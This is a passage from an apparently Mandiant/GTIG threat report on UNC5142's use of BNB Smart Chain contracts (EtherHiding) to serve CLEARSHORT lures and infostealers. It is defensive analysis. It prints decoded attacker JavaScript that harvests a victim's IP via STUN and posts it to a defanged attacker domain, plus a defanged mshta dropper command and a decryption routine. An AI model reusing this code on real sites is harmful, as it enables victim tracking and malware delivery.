domains. Cloudflare Pages is a legitimate service maintained by Cloudflare that provides a quick mechanism for standing up a website online, leveraging Cloudflare’s network to ensure it loads swiftly. These pages provide several advantages: Cloudflare is a trusted company, so these pages are less likely to be immediately blocked, and it is easy for the attackers to quickly create new pages if old ones are taken down.</span></p>\n<h4><span style=\"vertical-align: baseline;\">The Three Smart Contract System</span></h4>\n<p><span style=\"vertical-align: baseline;\">The most significant change is the shift from a single smart contract system to a three smart contract system. This new architecture is an adaptation of a legitimate software design principle known as the </span><strong style=\"vertical-align: baseline;\">proxy pattern</strong><span style=\"vertical-align: baseline;\">, which developers use to make their contracts upgradable. A stable, unchangeable proxy forwards calls to a separate second-level contract that can be replaced to fix bugs or add features.</span></p>\n<p><span style=\"vertical-align: baseline;\">This setup functions as a highly efficient </span><strong style=\"vertical-align: baseline;\">Router-Logic-Storage</strong><span style=\"vertical-align: baseline;\"> architecture where each contract has a specific job. This design allows for rapid updates to critical parts of the attack, such as the landing page URL or decryption key, without any need to modify the JavaScript on compromised websites. As a result, the campaigns are much more agile and resistant to takedowns.</span></p>\n<p><strong style=\"vertical-align: baseline;\">1) Initial call to the First-Level contract:</strong><span style=\"vertical-align: baseline;\"> The infection begins when the injected JavaScript on a compromised website makes a </span><code style=\"vertical-align: baseline;\">eth_call</code><span style=\"vertical-align: baseline;\"> to the </span><strong style=\"vertical-align: baseline;\">First-Level Smart Contract</strong><span style=\"vertical-align: baseline;\"> (e.g., </span><a href=\"https://bscscan.com/address/0x9179dda8b285040bf381aabb8a1f4a1b8c37ed53\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x9179dda8B285040Bf381AABb8a1f4a1b8c37Ed53</code></a><span style=\"vertical-align: baseline;\">). The primary function of this contract is to act as a </span><strong style=\"vertical-align: baseline;\">router</strong><span style=\"vertical-align: baseline;\">. Its job is to provide the address and Application Binary Interface (ABI) for the next stage, ensuring attackers rarely need to update the script across their vast network of compromised websites. The ABI data is returned in a compressed and base64 encoded format which the script decodes via </span><code style=\"vertical-align: baseline;\">atob()</code><span style=\"vertical-align: baseline;\"> and then decompresses using </span><code style=\"vertical-align: baseline;\">pako.unzip</code><span style=\"vertical-align: baseline;\"> to get the clean interface data.</span></p>\n<p><strong style=\"vertical-align: baseline;\">2) Victim fingerprinting via the Second-Level contract:</strong><span style=\"vertical-align: baseline;\"> The injected JavaScript connects to the </span><strong style=\"vertical-align: baseline;\">Second-Level Smart Contract</strong><span style=\"vertical-align: baseline;\"> (e.g., </span><a href=\"https://bscscan.com/address/0x8FBA1667BEF5EdA433928b220886A830488549BD\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x8FBA1667BEF5EdA433928b220886A830488549BD</code></a><span style=\"vertical-align: baseline;\">). This contract acts as the </span><strong style=\"vertical-align: baseline;\">logic</strong><span style=\"vertical-align: baseline;\"> of the attack, containing code to perform reconnaissance actions (Figure 5 and Figure 6). It makes a series of </span><code style=\"vertical-align: baseline;\">eth_call</code><span style=\"vertical-align: baseline;\"> operations to execute specific functions within the contract to fingerprint the victim’s environment:</span></p>\n<ul>\n<li><code><span style=\"vertical-align: baseline;\">teaCeremony (0x9f7a7126)</span></code><span style=\"vertical-align: baseline;\">, initially served as a method for dynamic code execution and page display. Later it was used for adding and removing POST check-ins.</span></li>\n<li><code><span style=\"vertical-align: baseline;\">shibuyaCrossing (0x1ba79aa2)</span></code><span style=\"vertical-align: baseline;\">, responsible for identifying the victim's platform or operating system with additional OS/platform values added over time</span></li>\n<li><code><span style=\"vertical-align: baseline;\">asakusaTemple (0xa76e7648)</span></code><span style=\"vertical-align: baseline;\">, initially a placeholder for console log display that later evolved into a beacon for tracking user interaction stages by sending user-agent values</span></li>\n<li><code><span style=\"vertical-align: baseline;\">ginzaLuxury (0xa98b06d3)</span></code><span style=\"vertical-align: baseline;\">, responsible for retrieving the code for finding, fetching, decrypting, and ultimately displaying the malicious lure to the user</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The functionality for command and control (C2) check-ins has evolved within the contract:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Late 2024:</strong><span style=\"vertical-align: baseline;\"> The script used a STUN server (</span><code style=\"vertical-align: baseline;\">stun:stun.l.google.com:19302</code><span style=\"vertical-align: baseline;\">) to obtain the victim's public IP and sent it to a domain like </span><code style=\"vertical-align: baseline;\">saaadnesss[.]shop</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">or</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">lapkimeow[.]icu/check</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">February 2025:</strong><span style=\"vertical-align: baseline;\"> The STUN-based POST check-in was removed and replaced with a cookie-based tracking mechanism (</span><code style=\"vertical-align: baseline;\">data-ai-collecting</code><span style=\"vertical-align: baseline;\">) within the </span><code style=\"vertical-align: baseline;\">teaCeremony</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x9f7a7126</code><span style=\"vertical-align: baseline;\">) function.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">April 2025:</strong><span style=\"vertical-align: baseline;\"> The check-in mechanism was reintroduced and enhanced. The </span><code style=\"vertical-align: baseline;\">asakusaTemple</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0xa76e7648</code><span style=\"vertical-align: baseline;\">) function was modified to send staged POST requests to the domain </span><code style=\"vertical-align: baseline;\">ratatui[.]today</code><span style=\"vertical-align: baseline;\">, beaconing at each phase of the lure interaction to track victim progression.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Example of second-level smart contract transaction contents\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Example of second-level smart contract transaction contents</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>//Example of code retrieved from the second-level smart contract (IP check and STUN)\nif (await new Promise(r =&gt; {\n        let a = new RTCPeerConnection({ iceServers: [{ urls: \"stun:stun.l.google.com:19302\" }] });\n        a.createDataChannel(\"\");\n        a.onicecandidate = e =&gt; {\n            let ip = e?.candidate?.candidate?.match(/\\d+\\.\\d+\\.\\d+\\.\\d+/)?.[0];\n            if (ip) {\n                fetch('https://saaadnesss[.]shop/check', { // Or lapkimeow[.]icu/check\n                    method: 'POST',\n                    headers: { 'Content-Type': 'application/json' },\n                    body: JSON.stringify({ ip, domain: location.hostname })\n                }).then(r =&gt; r.json()).then(data =&gt; r(data.status));\n                a.onicecandidate = null;\n            }\n        };\n        a.createOffer().then(o =&gt; a.setLocalDescription(o));\n    }) === \"Decline\") {\n        console.warn(\"Execution stopped: Declined by server\");\n    } else {\n        await teaCeremony(await orchid.methods.shibuyaCrossing().call(), 2);\n        await teaCeremony(await orchid.methods.akihabaraLights().call(), 3);\n        await teaCeremony(await orchid.methods.ginzaLuxury().call(), 4);\n        await teaCeremony(await orchid.methods.asakusaTemple().call(), 5);\n    }</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 6: Decoded reconnaissance code stored in second-level smart contract transaction</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">3) Lure &amp; payload URL hosting in Third-Level Contract:</strong><span style=\"vertical-align: baseline;\"> Once the victim is fingerprinted, the logic in the Second-Level Contract queries the </span><strong style=\"vertical-align: baseline;\">Third-Level Smart Contract</strong><span style=\"vertical-align: baseline;\"> (e.g., </span><a href=\"https://bscscan.com/address/0x53fd54f55C93f9BCCA471cD0CcbaBC3Acbd3E4AA\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x53fd54f55C93f9BCCA471cD0CcbaBC3Acbd3E4AA</code></a><span style=\"vertical-align: baseline;\">). This final contract acts as a configuration</span><strong style=\"vertical-align: baseline;\"> storage</strong><span style=\"vertical-align: baseline;\"> container. It typically contains the URL hosting the encrypted CLEARSHORT payload, the AES key to decrypt the page, and the URL hosting the second stage payload.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Encrypted landing page URL\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/unc5142-etherhiding-fig7a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Encrypted landing page URL</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Payload URL\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig8a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: Payload URL</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">By separating the static logic (second-level) from the dynamic configuration (third-level), UNC5142 can rapidly rotate domains, update lures, and change decryption keys with a single, cheap transaction to their third-level contract, ensuring their campaign remains effective against takedowns.</span></p>\n<h4><span style=\"vertical-align: baseline;\">How an Immutable Contract Can Be 'Updated'</span></h4>\n<p><span style=\"vertical-align: baseline;\">A key question that arises is how attackers can update something that is, by definition, unchangeable. The answer lies in the distinction between a smart contract's code and its data.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Immutable code:</strong><span style=\"vertical-align: baseline;\"> Once a smart contract is deployed, its program code is permanent and can never be altered. This is the part that provides trust and reliability.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Mutable data (state):</strong><span style=\"vertical-align: baseline;\"> However, a contract can also store data, much like a program uses a database. The permanent code of the contract can include functions specifically designed to change this stored data.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">UNC5142 exploits this by having their smart contracts built with special administrative functions. To change a payload URL, the actor uses their controlling wallet to send a transaction that calls one of these functions, feeding it the new URL. The contract's permanent code executes, receives this new information, and overwrites the old URL in its storage.</span></p>\n<p><span style=\"vertical-align: baseline;\">From that point on, any malicious script that queries the contract will automatically receive the new, updated address. The contract's program remains untouched, but its configuration is now completely different. This is how they achieve agility while operating on an immutable ledger.</span></p>\n<p><span style=\"vertical-align: baseline;\">An analysis of the transactions shows that a typical update, such as changing a lure URL or decryption key in the third-level contract, costs the actor between </span><strong style=\"vertical-align: baseline;\">$0.25 and $1.50 USD</strong><span style=\"vertical-align: baseline;\"> in network fees. After the one-time cost of deploying the smart contracts, the initial funding for an operator wallet is sufficient to cover several hundred such updates. This low operational cost is a key enabler of their resilient, high-volume campaigns, allowing them to rapidly adapt to takedowns with minimal expense.</span></p>\n<h4><span style=\"vertical-align: baseline;\">AES-Encrypted CLEARSHORT</span></h4>\n<p><span style=\"vertical-align: baseline;\">In December 2024, UNC5142 introduced AES encryption for the CLEARSHORT landing page, shifting away from Base64-encoded payloads that were used previously. Not only does this reduce the effectiveness of some detection efforts, it also increases the difficulty of analysis of the payload by security researchers. The encrypted CLEARSHORT landing page is typically hosted on a Cloudflare </span><span style=\"vertical-align: baseline;\">.dev</span><span style=\"vertical-align: baseline;\"> page. The function that decrypts the AES-encrypted landing page uses an initialization vector retrieved from the third smart contract (Figure 9 and Figure 10). The decryption is performed client-side within the victim's browser.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"AES Key within smart contract transaction\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig9a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: AES Key within smart contract transaction</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>// Simplified example of the decryption logic\nasync function decryptScrollToText(encryptedBase64, keyBase64) {\n    const key = Uint8Array.from(atob(keyBase64), c =&gt; c.charCodeAt(0));\n    const combinedData = Uint8Array.from(atob(encryptedBase64), c =&gt; c.charCodeAt(0));\n    const iv = combinedData.slice(0, 12); // IV is the first 12 bytes\n    const encryptedData = combinedData.slice(12);\n    const cryptoKey = await crypto.subtle.importKey(\n        \"raw\", key, \"AES-GCM\", false, [\"decrypt\"]\n    );\n    const decryptedArrayBuffer = await crypto.subtle.decrypt(\n        { name: \"AES-GCM\", iv },\n        cryptoKey,\n        encryptedData\n    );\n    return new TextDecoder().decode(decryptedArrayBuffer);\n}\n\n// ... (Code to fetch encrypted HTML and key from the third-level contract) ...\n\nif (cherryBlossomHTML) { // cherryBlossomHTML contains the encrypted landing page\n     try {\n        let sakuraKey = await JadeContract.methods.pearlTower().call(); // Get the AES key\n        const decryptedHTML = await decryptScrollToText(cherryBlossomHTML, sakuraKey);\n        // ... (Display the decrypted HTML in an iframe) ...\n    } catch (error) {\n        return;\n    }\n}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 10: Simplified decryption logic</span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">CLEARSHORT Templates and Lures</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC5142 has used a variety of lures for their landing page, evolving them over time: </span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">January 2025:</strong><span style=\"vertical-align: baseline;\"> Lures included fake Data Privacy agreements and reCAPTCHA turnstiles (Figure 11 and Figure 12).</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"“Disable Data Collection” CLEARSHORT lure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig11.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 11: “Disable Data Collection” CLEARSHORT lure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Fake reCAPTCHA lure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig12.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 12: Fake reCAPTCHA lure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><strong style=\"vertical-align: baseline;\">March 2025:</strong><span style=\"vertical-align: baseline;\"> The threat cluster began using a lure that mimics a Cloudflare IP web error (Figure 13).</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Cloudflare “Unusual Web Traffic” error\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/unc5142-etherhiding-fig13a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 13: Cloudflare “Unusual Web Traffic” error</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><strong style=\"vertical-align: baseline;\">May 2025:</strong><span style=\"vertical-align: baseline;\"> An \"Anti-Bot Lure\" was observed, presenting another variation of a fake verification step (Figure 14).</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Anti-Bot lure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig14.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 14: Anti-Bot Lure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">On-Chain Analysis</span></h4>\n<p><span style=\"vertical-align: baseline;\">Mandiant Threat Defense’s analysis of UNC5142's on-chain activity on the BNB Smart Chain reveals a clear and evolving operational strategy. A timeline of their blockchain transactions shows the use of two distinct sets of smart contract infrastructures, which </span><span style=\"vertical-align: baseline;\">GTIG</span><span style=\"vertical-align: baseline;\"> tracks as the Main and Secondary infrastructures. Both serve the same ultimate purpose, delivering malware via the CLEARSHORT downloader.</span></p>\n<p><span style=\"vertical-align: baseline;\">Leveraging BNB Smart Chain's smart contract similarity search, a process where the compiled bytecode of smart contracts is compared to find functional commonalities, revealed that the Main and Secondary smart contracts were identical at the moment of their creation. This strongly indicates that the same threat actor, UNC5142, is responsible for all observed activity. It is highly likely that the actor cloned their successful Main infrastructure to create the foundation for Secondary, which could then be updated via subsequent transactions to deliver different payloads.</span></p>\n<p><span style=\"vertical-align: baseline;\">Further analysis of the funding sources shows that the primary operator wallets for both groups received funds from the same intermediary wallet (</span><a href=\"https://bscscan.com/address/0x3b5a23f6207d87B423C6789D2625eA620423b32D\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x3b5a...32D</code></a><span style=\"vertical-align: baseline;\">), an account associated with the OKX cryptocurrency exchange. While attribution based solely on transactions from a high-volume exchange wallet requires caution, this financial link, combined with the identical smart contract code and mirrored deployment methodologies, makes it highly likely that a single threat actor, UNC5142, controls both infrastructures.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Parallel Distribution Infrastructures</span></h5>\n<p><span style=\"vertical-align: baseline;\">Transaction records show key events for both groups occurring in close proximity, indicating coordinated management.</span></p>\n<p><span style=\"vertical-align: baseline;\">On </span><strong style=\"vertical-align: baseline;\">Feb. 18, 2025</strong><span style=\"vertical-align: baseline;\">, not only was the entire Secondary infrastructure created and configured, but the Main operator wallet also received additional funding on the same day. This coordinated funding activity strongly suggests a single actor preparing for and executing an expansion of their operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Furthermore, on </span><strong style=\"vertical-align: baseline;\">March 3, 2025</strong><span style=\"vertical-align: baseline;\">, transaction records show that operator wallets for both Main and Secondary infrastructures conducted payload and lure update activities. This demonstrates concurrent campaign management, where the actor was actively maintaining and running separate distribution efforts through both sets of smart contracts simultaneously.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Main</span></h5>\n<p><span style=\"vertical-align: baseline;\">Mandiant Threat Defense analysis pinpoints the creation of the Main infrastructure to a brief, concentrated period on </span><strong style=\"vertical-align: baseline;\">Nov. 24, 2024</strong><span style=\"vertical-align: baseline;\">. The primary Main operator wallet (</span><a href=\"https://bscscan.com/address/0xF5B962Cca374de0b769617888932250363C5971B\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0xF5B9...71B</code></a><span style=\"vertical-align: baseline;\">) was initially funded on the same day </span><span style=\"vertical-align: baseline;\">with </span><strong style=\"vertical-align: baseline;\">0.1 BNB</strong><span style=\"vertical-align: baseline;\"> (worth approximately $66 USD at the time)</span><span style=\"vertical-align: baseline;\">. Over the subsequent months, this wallet and its associated intermediary wallets received funding on multiple occasions, ensuring the actor had sufficient BNB to cover transaction fees for ongoing operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">The transaction history for Main infrastructure shows consistent updates over the course of the first half of 2025. Following the initial setup, Mandiant observed payload and lure updates occurring on a near-monthly and at times bi-weekly basis from December 2024 through the end of May 2025. This sustained activity, characterized by frequent updates to the third-level smart contract, demonstrates its role as the primary infrastructure for UNC5142's campaigns.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Secondary</span></h5>\n<p><span style=\"vertical-align: baseline;\">Mandiant Threat Defense observed a significant operational expansion where the actor deployed the new, parallel Secondary infrastructure. The Secondary operator wallet (</span><a href=\"https://bscscan.com/address/0x9AAe9A373CECe9Ef8453fa2dEAF4bf7B8aFBfac9\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">0x9AAe...fac9</code></a><span style=\"vertical-align: baseline;\">) was funded on </span><strong style=\"vertical-align: baseline;\">Feb. 18, 2025</strong><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">receiving </span><strong style=\"vertical-align: baseline;\">0.235 BNB</strong><span style=\"vertical-align: baseline;\"> (approximately $152 USD at the time). S</span><span style=\"vertical-align: baseline;\">hortly after, the entire three-contract system was deployed and configured. Mandiant observed that updates to Secondary infrastructure were active between late February and early March 2025. After this initial period, the frequency of updates to the Secondary smart contracts decreased substantially.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Timeline of UNC5142&#x27;s on-chain infrastructure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig15.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 15: Timeline of UNC5142's on-chain infrastructure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The Main infrastructure stands out as the core campaign infrastructure, marked by its early creation and steady stream of updates. The Secondary infrastructure appears as a parallel, more tactical deployment, likely established to support a specific surge in campaign activity, test new lures, or simply build operational resilience.</span></p>\n<p><span style=\"vertical-align: baseline;\">As of this publication, the last observed on-chain update to this infrastructure occurred on July 23, 2025, suggesting a pause in this campaign or a potential shift in the actor's operational methods. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Final Payload Distribution</span></h3>\n<p><span style=\"vertical-align: baseline;\">Over the past year, Mandiant Threat Defense has observed UNC5142 distribute a wide range of final payloads, including VIDAR, LUMMAC.V2, and RADTHIEF (Figure 16). Given the distribution of a variety of payloads over a range of time, it is possible that UNC5142 functions as a malware distribution threat cluster. Distribution threat clusters play a significant role within the cyber criminal threatscape, providing actors of varying levels of technical sophistication a means to distribute malware and/or gain initial access to victim environments. However, given the consistent distribution of infostealers, it’s also plausible that the threat cluster’s objective is to obtain stolen credentials to facilitate further operations, such as selling the credentials to other threat clusters. While the exact business model of UNC5142 is unclear, GTIG currently does not attribute the final payloads to the threat cluster due to the possibility it is a distribution threat cluster.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC5142 final payload distribution over time\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig16.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 16: UNC5142 final payload distribution over time</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">An analysis of their infection chains since the beginning of 2025 reveals that UNC5142 follows a repeatable four-stage delivery chain after the initial CLEARSHORT lure:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The initial dropper:</strong><span style=\"vertical-align: baseline;\"> The first stage almost always involves the execution of a remote HTML Application (.hta) file, often disguised with a benign file extension like .xll (Excel Add-in). This component, downloaded from a malicious domain or a legitimate file-sharing service, serves as the entry point for executing code on the victim's system outside the browser's security sandbox.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The PowerShell loader:</strong><span style=\"vertical-align: baseline;\"> The initial dropper’s primary role is to download and execute a second-stage PowerShell script. This script is responsible for defense evasion and orchestrating the download of the final payload.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Abuse of legitimate services:</strong><span style=\"vertical-align: baseline;\"> The actor has consistently leveraged legitimate file hosting services such as </span><strong style=\"vertical-align: baseline;\">GitHub</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">MediaFire</strong><span style=\"vertical-align: baseline;\"> to host encrypted data blobs, with some instances observed where final payloads were hosted on their own infrastructure. This tactic helps the malicious traffic blend in with legitimate network activity, bypassing reputation-based security filters.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">In-memory execution:</strong><span style=\"vertical-align: baseline;\"> In early January, executables were being used to serve VIDAR, but since then, the final malware payload has transitioned to being delivered as an encrypted data blob disguised as a common file type (e.g., .mp4, .wav, .dat). The PowerShell loader contains the logic to download this blob, decrypt it in memory, and execute the final payload (often a .NET loader), without ever writing the decrypted malware to disk.</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC5142 Infostealer delivery infection chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig17a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 17: UNC5142 Infostealer delivery infection chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Earlier Campaigns</span></h4>\n<p><span style=\"vertical-align: baseline;\">In earlier infection chains, the URL for the first-stage </span><strong style=\"vertical-align: baseline;\">.hta</strong><span style=\"vertical-align: baseline;\"> dropper was often hardcoded directly into the CLEARSHORT lure's command (e.g., </span><strong style=\"vertical-align: baseline;\">mshta hxxps[:]//...pages.dev</strong><span style=\"vertical-align: baseline;\">). The intermediate PowerShell script would then download the final malware directly from a public repository like GitHub.</span></p>\n<h4><span style=\"vertical-align: baseline;\">January 2025</span></h4>\n<p><span style=\"vertical-align: baseline;\">The actor’s primary evolution was to stop delivering the malware directly as an executable file. Instead, they began hosting encrypted data blobs on services like MediaFire, disguised as media files (.mp4, .mp3). The PowerShell loaders were updated to include decryption routines (e.g., AES, TripleDES) to decode these blobs in memory, revealing a final-stage .NET dropper or the malware itself.</span></p>\n<h4><span style=\"vertical-align: baseline;\">February 2025 &amp; Beyond</span></h4>\n<p><span style=\"vertical-align: baseline;\">The most significant change was the deeper integration of their on-chain infrastructure. Instead of hardcoding the dropper URL in the lure, the CLEARSHORT script began making a direct </span><strong style=\"vertical-align: baseline;\">eth_call</strong><span style=\"vertical-align: baseline;\"> to the </span><strong style=\"vertical-align: baseline;\">Third-Level Smart Contract</strong><span style=\"vertical-align: baseline;\">. The smart contract now dynamically provides the URL of the first-stage dropper. This gives the actor complete, real-time control over their post-lure infrastructure; they can change the dropper domain, filename, and the entire subsequent chain by simply 